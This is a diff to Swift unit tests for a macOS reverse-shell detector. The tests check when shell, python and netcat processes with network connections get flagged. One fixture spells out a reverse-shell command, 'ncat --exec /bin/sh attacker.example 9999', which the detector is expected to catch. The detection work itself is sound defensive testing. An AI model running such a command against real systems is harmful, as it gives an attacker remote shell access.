@@ -14,12 +14,15 @@ final class ReverseShellDetectorTests: XCTestCase {
     private func makeProc(
         pid: Int32 = 100,
         name: String,
-        path: String = "/bin/bash"
+        path: String = "/bin/bash",
+        parentName: String = "",
+        signingStatus: SigningStatus = .unsigned,
+        arguments: [String] = []
     ) -> NickProcessInfo {
         NickProcessInfo(
             pid: pid, path: path, name: name,
-            parentPID: 1, parentName: "",
-            signingStatus: .adHoc, metadata: ProcessMetadata(user: "user", startTime: Date())
+            parentPID: 1, parentName: parentName,
+            signingStatus: signingStatus, metadata: ProcessMetadata(user: "user", startTime: Date(), arguments: arguments)
         )
     }
 
@@ -47,21 +50,21 @@ final class ReverseShellDetectorTests: XCTestCase {
         let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
         XCTAssertFalse(signals.isEmpty)
         XCTAssertEqual(signals.first?.severity, .high)
-        XCTAssertEqual(signals.first?.metadata["reason"], "reverse_shell_port")
+        XCTAssertEqual(signals.first?.metadata["reason"], "reverse_shell")
     }
 
-    func test_signals_zshWithUnusualPort_returnsHighSignal() {
-        let proc = makeProc(pid: 101, name: "zsh")
+    func test_signals_zshFromTerminalWithUnusualPort_returnsEmpty() {
+        let proc = makeProc(pid: 101, name: "zsh", parentName: "Terminal")
         let conn = makeConn(pid: 101, remotePort: 1337)
         let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
-        XCTAssertFalse(signals.isEmpty)
+        XCTAssertTrue(signals.isEmpty)
     }
 
-    func test_signals_pythonWithUnusualPort_returnsHighSignal() {
-        let proc = makeProc(pid: 102, name: "python3", path: "/usr/bin/python3")
+    func test_signals_signedPythonFromTerminalWithUnusualPort_returnsEmpty() {
+        let proc = makeProc(pid: 102, name: "python3", path: "/usr/bin/python3", parentName: "Terminal", signingStatus: .signed(teamID: "APPLE"))
         let conn = makeConn(pid: 102, remotePort: 9001)
         let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
-        XCTAssertFalse(signals.isEmpty)
+        XCTAssertTrue(signals.isEmpty)
     }
 
     // MARK: - Shell → safe port (no signal)
@@ -129,23 +132,27 @@ final class ReverseShellDetectorTests: XCTestCase {
         XCTAssertFalse(signals.isEmpty)
     }
 
-    // MARK: - netcat always suspicious
+    // MARK: - netcat context
 
-    func test_signals_ncWithAnyConnection_returnsHighSignal() {
-        let proc = makeProc(pid: 600, name: "nc", path: "/usr/bin/nc")
-        let conn = makeConn(pid: 600, remotePort: 443) // even safe port
-        let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
-        // nc on port 443 — may produce "netcat_connection" signal
-        // Check: process is flagged regardless of port
-        let ncSignal = signals.first { $0.metadata["reason"] == "netcat_connection" }
-        XCTAssertNotNil(ncSignal)
+    func test_signals_ncHealthCheckFromTerminal_returnsEmpty() {
+        let proc = makeProc(
+            pid: 600, name: "nc", path: "/usr/bin/nc",
+            parentName: "Terminal", signingStatus: .signed(teamID: "APPLE"),
+            arguments: ["nc", "-z", "example.com", "443"]
+        )
+        let conn = makeConn(pid: 600, remotePort: 443)
+        XCTAssertTrue(ReverseShellDetector.signals(from: [proc], connections: [conn]).isEmpty)
     }
 
-    func test_signals_ncatWithConnection_returnsHighSignal() {
-        let proc = makeProc(pid: 601, name: "ncat", path: "/usr/bin/ncat")
+    func test_signals_ncatExecMode_returnsHighSignal() {
+        let proc = makeProc(
+            pid: 601, name: "ncat", path: "/usr/bin/ncat",
+            parentName: "Terminal", signingStatus: .signed(teamID: "APPLE"),
+            arguments: ["ncat", "--exec", "/bin/sh", "attacker.example", "9999"]
+        )
         let conn = makeConn(pid: 601, remotePort: 9999)
         let signals = ReverseShellDetector.signals(from: [proc], connections: [conn])
-        XCTAssertFalse(signals.isEmpty)
+        XCTAssertTrue(signals.contains { $0.metadata["reason"] == "reverse_shell" })
     }
 
     // MARK: - Trusted process list — reverse shell signals are NOT suppressed
